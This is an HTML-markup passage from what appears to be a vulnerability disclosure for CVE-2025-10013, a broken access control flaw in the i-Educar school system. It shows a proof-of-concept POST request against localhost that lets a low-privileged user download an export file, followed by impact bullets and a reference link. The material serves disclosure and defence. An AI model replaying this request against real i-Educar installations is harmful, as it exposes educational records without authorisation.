&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Length: 47
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Origin: http://localhost
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection: keep-alive
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Referer: http://localhost/exportacao-para-o-seb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Cookie: i_educar_session=ikrAPvWjSx0V5drm82zlgu1kBByJdsCx1gJkiwsu
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Upgrade-Insecure-Requests: 1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Sec-Fetch-Dest: document
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Sec-Fetch-Mode: navigate
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Sec-Fetch-Site: same-origin
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Sec-Fetch-User: ?1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Priority: u=0, i
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ano=2025&lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt;ref_cod_instituicao=1&lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt;ref_cod_escola=4
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;&lt;ul&gt;&lt;li&gt;We could observe that a file is attached to the response. This user shouldn&#39;t do this request.&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/p/cve-2025-10013/image-2.png&#34;
	width=&#34;1434&#34;
	height=&#34;538&#34;
	srcset=&#34;/p/cve-2025-10013/image-2_hu_d9f0374d4aca283a.png 480w, /p/cve-2025-10013/image-2_hu_6d9f4bc0f197d6ba.png 1024w&#34;
	loading=&#34;lazy&#34;


		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;266&#34;
		data-flex-basis=&#34;639px&#34;

 /&gt;&lt;/p&gt;
&lt;h2 id=&#34;impact&#34;&gt;Impact
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;Broken Access Control vulnerabilities can have severe consequences, including:
  &lt;ul&gt;
    &lt;li&gt;Unauthorized access to restricted functionality;&lt;/li&gt;
    &lt;li&gt;Escalation of privileges for low-level users;&lt;/li&gt;
    &lt;li&gt;Exposure of sensitive data and potential system compromise;&lt;/li&gt;
    &lt;li&gt;Loss of confidentiality and integrity of educational records;&lt;/li&gt;
    &lt;li&gt;Reputational damage to the organization.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/p&gt;
&lt;h2 id=&#34;reference&#34;&gt;Reference
&lt;/h2&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/marcelomulder/CVE/blob/main/i-educar/CVE-2025-10013.md&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/marcelomulder/CVE/blob/main/i-educar/CVE-2025-10013.md&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
